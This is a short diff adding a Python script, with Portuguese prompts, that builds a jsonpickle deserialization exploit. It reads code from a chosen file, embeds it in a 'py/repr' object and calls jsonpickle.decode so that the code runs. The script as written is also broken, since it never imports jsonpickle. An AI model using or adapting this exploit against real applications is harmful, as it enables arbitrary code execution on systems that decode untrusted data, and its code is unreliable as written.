@@ -1,0 +1,9 @@
+import io
+code = open(input('  [+] Informe o caminho do payloade: '), 'r')
+try:
+  payload = '{"1": {"py/repr": code.read()}, "2": {"py/id": 67}}'
+except:
+  exit('  [!] Erro ao gerar payload!')
+print('\n   ====== Payload ======\n')
+print(jsonpickle.decode(payload))
+print('\n   ====== Payload ======\n')
